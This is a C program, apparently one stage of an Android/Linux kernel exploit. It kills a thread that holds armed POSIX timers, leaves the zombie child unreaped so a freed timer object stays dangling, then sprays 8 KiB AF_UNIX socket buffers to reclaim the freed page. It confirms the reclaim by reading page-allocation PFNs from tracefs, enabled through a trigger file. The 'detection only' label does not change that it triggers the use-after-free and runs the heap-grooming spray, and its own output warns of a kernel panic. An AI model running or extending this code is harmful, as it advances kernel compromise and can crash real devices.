/*
 * claimdetect - did our 8 KiB AF_UNIX stream claim the page freed by the
 * timer slab? Detection only: we watch mm_page_free / mm_page_alloc PFNs in the
 * trace and never reap the zombie, so the dangling node is never walked.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <pthread.h>
#include <stdint.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/syscall.h>

#define T "/sys/kernel/tracing"

static int write_str(const char *p, const char *v)
{
    int fd = open(p, O_WRONLY); ssize_t n;
    if (fd < 0) return -1;
    n = write(fd, v, strlen(v)); close(fd);
    return n > 0 ? 0 : -1;
}

static int append_str(const char *p, const char *v)
{
    int fd = open(p, O_WRONLY | O_APPEND); ssize_t n;
    if (fd < 0) return -1;
    n = write(fd, v, strlen(v)); close(fd);
    return n > 0 ? 0 : -1;
}

static void noop(int s) { (void)s; }

struct ctx { int fd; pid_t tid; };

static void *exec_thread(void *arg)
{
    struct ctx *c = (struct ctx *)arg;
    char *argv[] = { (char *)"/system/bin/sh", (char *)"-c", (char *)"true", NULL };
    (void)!write(c->fd, &c->tid, sizeof(c->tid));
    execve(argv[0], argv, NULL);
    return NULL;
}

int main(void)
{
    int pipefd[2];
    pid_t child, tid = 0;
    int i;
    char buf[8192];
    int streams = 0;

    printf("=== claim detect ===\n");

    /* enable the two page events through the writable trigger */
    {
        int r1 = append_str(T "/events/kmem/rss_stat/trigger", "enable_event:kmem:mm_page_free\n");
        int r2 = append_str(T "/events/kmem/rss_stat/trigger", "enable_event:kmem:mm_page_alloc\n");
        printf("trigger append: free=%d alloc=%d\n", r1, r2);
    }
    write_str(T "/tracing_on", "0\n");
    { int fd = open(T "/trace", O_WRONLY | O_TRUNC); if (fd >= 0) close(fd); }
    write_str(T "/tracing_on", "1\n");

    /* fire rss_stat so the triggers take effect */
    { size_t n = 4u << 20; char *m = malloc(n); if (m) { memset(m, 0x5a, n); free(m); } }

    if (pipe(pipefd) != 0) return 1;
    child = fork();
    if (child == 0) {
        pthread_t th;
        struct ctx c;
        timer_t timers[8];
        struct sigevent sev;
        struct itimerspec its;
        struct sigaction sa;
        int armed = 0;

        close(pipefd[0]);
        memset(&sa, 0, sizeof(sa)); sa.sa_handler = noop; sigaction(SIGRTMIN, &sa, NULL);
        memset(&sev, 0, sizeof(sev));
        sev.sigev_notify = SIGEV_SIGNAL;      /* must be SIGEV_SIGNAL to queue */
        sev.sigev_signo = SIGRTMIN;
        memset(&its, 0, sizeof(its));
        its.it_value.tv_nsec = 900000L;
        its.it_interval.tv_nsec = 900000L;
        for (i = 0; i < 8; i++) {
            if (timer_create(CLOCK_THREAD_CPUTIME_ID, &sev, &timers[i]) != 0) break;
            if (timer_settime(timers[i], 0, &its, NULL) != 0) break;
            armed++;
        }
        (void)armed;
        c.fd = pipefd[1];
        c.tid = (pid_t)syscall(SYS_gettid);
        if (pthread_create(&th, NULL, exec_thread, &c) != 0) _exit(9);
        for (;;) pause();          /* park: never exit, so nobody reaps */
    }

    close(pipefd[1]);
    if (read(pipefd[0], &tid, sizeof(tid)) != (ssize_t)sizeof(tid)) tid = 0;
    close(pipefd[0]);
    printf("child=%d exec_tid=%d armed timers on %d\n", (int)child, (int)tid, 8);

    usleep(150);
    if (tid > 0 && syscall(SYS_tgkill, child, tid, SIGKILL) != 0) {
        printf("tgkill: %s\n", strerror(errno));
    }
    usleep(30000);   /* let do_exit/exit_itimers run; do NOT waitpid */

    /* claim attempt: 8 KiB stream writes */
    memset(buf, 'A', sizeof(buf));
    for (i = 0; i < 256; i++) {
        int sv[2];
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) != 0) break;
        if (send(sv[0], buf, sizeof(buf), MSG_DONTWAIT) < 0) { close(sv[0]); close(sv[1]); break; }
        /* keep both ends open so the skb (and its frag page) stays alive */
        streams++;
    }
    printf("streams sent: %d\n", streams);
    usleep(100000);
    write_str(T "/tracing_on", "0\n");

    /* read the text trace and compare PFNs */
    {
        int fd = open(T "/trace", O_RDONLY);
        char *big = malloc(1 << 20);
        ssize_t n = 0;
        if (fd >= 0 && big) {
            n = read(fd, big, (1 << 20) - 1);
            if (n > 0) {
                big[n] = 0;
                {
                    char *line = big;
                    int nf = 0, na = 0;
                    while (line && *line) {
                        char *nl = strchr(line, '\n');
                        if (nl) *nl = 0;
                        {
                            char *pf = strstr(line, "mm_page_free:");
                            char *pa = strstr(line, "mm_page_alloc:");
                            char *pp = strstr(line, "pfn=0x");
                            if (pp) {
                                unsigned long long pfn = strtoull(pp + 6, NULL, 16);
                                if (pf && nf < 8) { printf("  FREE  pfn=0x%llx  %s\n", pfn, line + 0); nf++; }
                                else if (pa && na < 8) { printf("  ALLOC pfn=0x%llx\n", pfn); na++; }
                            }
                        }
                        line = nl ? nl + 1 : NULL;
                    }
                    printf("  mm_page_free lines: %d   mm_page_alloc lines: %d\n", nf, na);
                }
            }
            close(fd);
        }
        free(big);
    }
    printf("NOTE: the zombie is still parked on purpose; nothing reaped it.\n");
    printf("kill -9 %d   # only after you accept a possible panic on reap\n", (int)child);
    return 0;
}
